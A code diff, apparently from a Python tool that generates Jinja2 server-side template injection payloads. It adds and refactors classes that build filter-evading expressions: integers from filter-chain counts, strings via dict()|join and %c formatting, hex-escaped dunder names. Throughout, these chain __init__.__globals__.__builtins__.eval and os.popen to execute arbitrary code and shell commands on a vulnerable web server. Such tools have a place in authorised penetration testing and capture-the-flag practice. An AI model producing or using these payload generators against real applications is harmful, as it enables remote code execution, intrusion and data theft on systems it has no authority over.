@@ -22,7 +22,7 @@ pattern可以根据依赖关系生成一个列表，内容为所依赖pattern的
 
 '''
 
-before_dict = {
+vars_dict = {
     "zols": "{%set zols=lipsum|escape|urlencode|list|escape|urlencode|count%}",
     "ltr": "{%set ltr={}|escape|urlencode|list|escape|urlencode|count%}",
     "lea": "{%set lea=namespace|escape|urlencode|escape|urlencode|urlencode|urlencode|count%}",
@@ -37,7 +37,7 @@ before_dict = {
     "l": "{%set l={}|escape|first|count%}",
 }
 
-before = "".join(before_dict.values())
+vars_str = "".join(vars_dict.values())
 
 number_dict = {
     2015: "zols",
@@ -54,6 +54,20 @@ number_dict = {
 }
 
 
+def get_int_from_sum(i):
+    d = [(k, v) for k, v in number_dict.items() if 0 < k <= i]
+    d = dict(sorted(d, key = lambda x: x[0], reverse=True))
+    ans = []
+    for k, v in d.items():
+        while k <= i:
+            i -= k
+            ans.append(v)
+    if i :
+        return None
+    return ans
+
+use_record = {}
+
 class BasePattern(metaclass=abc.ABCMeta):
 
     def __init__(self):
@@ -68,6 +82,7 @@ class BasePattern(metaclass=abc.ABCMeta):
         use = {}
         for mother_pattern_class, *args in self._direct_requirements:
             subclasses = mother_pattern_class.__subclasses__()
+            subclasses = sorted(subclasses, key = lambda x: use_record.get(x, 0), reverse=True)
             for pattern_class in subclasses:
 
                 p = pattern_class(*args)
@@ -78,12 +93,13 @@ class BasePattern(metaclass=abc.ABCMeta):
                     continue
 
                 use[(mother_pattern_class, *args)] = p
-                # logger.debug(
-                #     f"{self.__class__.__name__} Test {mother_pattern_class.__name__} {args} success (depth: {depth})"
-                # )
+                use_record[pattern_class] = use_record.get(pattern_class, 0) + 1
+                logger.debug(
+                    f"{self.__class__.__name__} Test {mother_pattern_class.__name__} {args} success"
+                )
                 break
             else:
-                logger.info(
+                logger.debug(
                     f"{self.__class__.__name__} Test {mother_pattern_class.__name__} {args} failed, rolling back")
                 return False
 
@@ -184,6 +200,13 @@ class ZeroPattern3(ZeroPattern):
     def _generate(self):
         return "({}|urlencode|count)"
 
+class ZeroPattern4(ZeroPattern):
+    def __init__(self):
+        super().__init__()
+        self.require(PlainPattern, "({}|int)")
+
+    def _generate(self):
+        return "({}|int)"
 
 class PositiveIntPattern(BasePattern):
     pass
@@ -209,18 +232,21 @@ class PositiveIntPattern2(PositiveIntPattern):
 
         if not should_set_abcd:
 
-            print("You should use:" + before)
+            print("You should use:" + vars_str)
             should_set_abcd = True
 
-        payload = []
+        # payload = []
 
-        for i, s in number_dict.items():
-            while num >= i:
-                num -= i
-                payload.append(s)
+        # for i, s in number_dict.items():
+        #     while num >= i:
+        #         num -= i
+        #         payload.append(s)
         
-        if num:
+        payload = get_int_from_sum(num)
+
+        if payload is None:
             self.require(WillErrorPattern)
+            return 
 
         self.s = f"({'+'.join(payload)})"
 
@@ -238,18 +264,15 @@ class PositiveIntPattern3(PositiveIntPattern):
 
         if not should_set_abcd:
 
-            print("You should use:" + before)
+            print("You should use:" + vars_str)
 
             should_set_abcd = True
 
-        payload = []
+        payload = get_int_from_sum(num)
 
-        for i, s in number_dict.items():
-            while num >= i:
-                num -= i
-                payload.append(s)
-        if num:
+        if payload is None:
             self.require(WillErrorPattern)
+            return 
 
         payload_str = "".join([f".__add__({s})"for s in payload])
 
@@ -268,18 +291,14 @@ class PositiveIntPattern4(PositiveIntPattern):
 
         if not should_set_abcd:
 
-            print("You should use:" + before)
+            print("You should use:" + vars_str)
             should_set_abcd = True
 
-        payload = []
+        payload = get_int_from_sum(num)
 
-        for i, s in number_dict.items():
-            while num >= i:
-                num -= i
-                payload.append(s)
-
-        if num:
+        if payload is None:
             self.require(WillErrorPattern)
+            return 
 
         payload_str = "".join(
             [f"|attr(\"\\x5f\\x5fadd\\x5f\\x5f\")({s})"for s in payload])
@@ -313,21 +332,20 @@ class PositiveIntPattern6(PositiveIntPattern):
 
         biggest_num = min([i for i in number_dict.keys() if i >= num])
 
-        self.l = [number_dict[biggest_num], ]
-        diff = biggest_num - num
-        for num_now, s in number_dict.items():
-            while diff - num_now >= 0:
-                diff -= num_now
-                self.require(PlainPattern, s)
-                self.l.append(s)
+        payload = get_int_from_sum(biggest_num - num)
 
-        if diff:
+        if payload is None:
             self.require(WillErrorPattern)
+            return 
 
-        self.require(PlainPattern, "-")
+        payload = [number_dict[biggest_num], ] + payload
+        
+        self.s = "(" + "-".join(payload) + ")"
+
+        self.require(PlainPattern, self.s)
 
     def _generate(self):
-        return "(" + "-".join(self.l) + ")"
+        return self.s
 
 
 class SubPositiveIntPattern(BasePattern):
@@ -569,7 +587,7 @@ class StrPattern(BasePattern):
 class StrPattern1(StrPattern):
     def __init__(self, inner_s):
         super().__init__()
-        self.inner_s = inner_s
+        self.inner_s = inner_s.replace("'", "\\'")
         self.require(PlainPattern, inner_s)
         self.require(PlainPattern, "'")
 
@@ -580,7 +598,7 @@ class StrPattern1(StrPattern):
 class StrPattern2(StrPattern):
     def __init__(self, inner_s):
         super().__init__()
-        self.inner_s = inner_s
+        self.inner_s = inner_s.replace('"', '\\"')
         self.require(PlainPattern, inner_s)
         self.require(PlainPattern, '"')
 
@@ -670,14 +688,42 @@ class StrPattern8(StrPattern):
             self.require(WillErrorPattern)
             return
 
-        self.s = f"dict({inner_s}=cycler)|join"
-        self.require(PlainPattern, self.s)
+        self.inner_s = inner_s
+
+        self.s = "dict({}={})|join"
+        self.require(PlainPattern, self.s.replace("{}", ""))
+        self.require(PlainPattern, inner_s)
+        self.require(IntPattern, 1)
 
     def _generate(self):
-        return self.s
-
+        return self.s.format(
+            self.use(PlainPattern, inner_s),
+            self.use(IntPattern, 1)
+        )
 
 class StrPattern9(StrPattern):
+    def __init__(self, inner_s):
+        super().__init__()
+        import re
+        if not re.match("^[a-zA-Z_][a-zA-Z0-9_]*$", inner_s):
+            self.require(WillErrorPattern)
+            return
+
+        mid = len(inner_s) // 2
+        s_a, s_b = inner_s[:mid], inner_s[mid:]
+
+        self.s = f"dict({s_a}=%s,{s_b}=%s)|join"
+        self.require(PlainPattern, self.s.replace("%s", ""))
+        self.require(IntPattern, 1)
+
+    def _generate(self):
+        return self.s % (
+            self.use(IntPattern, 1),
+            self.use(IntPattern, 1)
+        )
+
+
+class StrPattern10(StrPattern):
     def __init__(self, inner_s):
         super().__init__()
         import re
@@ -711,6 +757,42 @@ class StrPattern101(StrPattern):
         self.inner_s = inner_s
 
         self.pattern = "({})*{}%({})"
+
+        self.require(PlainPattern, self.pattern.replace("{}", ""))
+
+        self.require(PercentSignLowerCPattern)
+
+        self.require(IntPattern, len(self.inner_s))
+        for c in inner_s:
+            self.require(IntPattern, ord(c))
+        self.require(PlainPattern, ",")
+
+        # inner_s_numbers = ",".join([str(ord(c)) for c in inner_s])
+        # self.full_s = pattern.format(len(inner_s), inner_s_numbers)
+        # self.require(PlainPattern, inner_s_numbers)
+        # self.require(PlainPattern, self.full_s)
+
+    def _generate(self):
+        numbers = ",".join([
+            self.use(IntPattern, ord(c)).strip("(").strip(")")
+            for c in self.inner_s
+        ])
+
+        return self.pattern.format(
+            self.use(PercentSignLowerCPattern),
+            self.use(IntPattern, len(self.inner_s)),
+            numbers
+        )
+
+class StrPattern102(StrPattern):
+    def __init__(self, inner_s):
+        super().__init__()
+
+        assert len(inner_s)
+
+        self.inner_s = inner_s
+
+        self.pattern = "({})*{}|format({})"
 
         self.require(PlainPattern, self.pattern.replace("{}", ""))
 
@@ -939,28 +1021,6 @@ class EvalPattern2(EvalPattern):
         self.oneline_code = oneline_code
         self.require(PlainPattern, "()")
         self.require(ConcatedAttrItemPattern, "joiner", (
-            (AttrPattern, "__globals__"),
-            (ItemPattern, "__builtins__"),
-            (ItemPattern, "eval"),
-        ))
-        self.require(StrPattern, self.oneline_code)
-
-    def _generate(self):
-        return "(%s)(%s)" % (
-            self.use(ConcatedAttrItemPattern, "joiner", (
-                (AttrPattern, "__globals__"),
-                (ItemPattern, "__builtins__"),
-                (ItemPattern, "eval"),
-            )),
-            self.use(StrPattern, self.oneline_code)
-        )
-
-class EvalPattern2(EvalPattern):
-    def __init__(self, oneline_code):
-        super().__init__()
-        self.oneline_code = oneline_code
-        self.require(PlainPattern, "()")
-        self.require(ConcatedAttrItemPattern, "joiner", (
             (AttrPattern, "__init__"),
             (AttrPattern, "__globals__"),
             (ItemPattern, "__builtins__"),
@@ -971,6 +1031,31 @@ class EvalPattern2(EvalPattern):
     def _generate(self):
         return "(%s)(%s)" % (
             self.use(ConcatedAttrItemPattern, "joiner", (
+                (AttrPattern, "__init__"),
+                (AttrPattern, "__globals__"),
+                (ItemPattern, "__builtins__"),
+                (ItemPattern, "eval"),
+            )),
+            self.use(StrPattern, self.oneline_code)
+        )
+
+
+class EvalPattern3(EvalPattern):
+    def __init__(self, oneline_code):
+        super().__init__()
+        self.oneline_code = oneline_code
+        self.require(PlainPattern, "()")
+        self.require(ConcatedAttrItemPattern, "x", (
+            (AttrPattern, "__init__"),
+            (AttrPattern, "__globals__"),
+            (ItemPattern, "__builtins__"),
+            (ItemPattern, "eval"),
+        ))
+        self.require(StrPattern, self.oneline_code)
+
+    def _generate(self):
+        return "(%s)(%s)" % (
+            self.use(ConcatedAttrItemPattern, "x", (
                 (AttrPattern, "__init__"),
                 (AttrPattern, "__globals__"),
                 (ItemPattern, "__builtins__"),
@@ -1220,4 +1305,3 @@ class OSPopenPattern2(OSPopenPattern):
             self.use(StrPattern, self.cmd),
             self.use(AttrPattern, "read")
         )
-
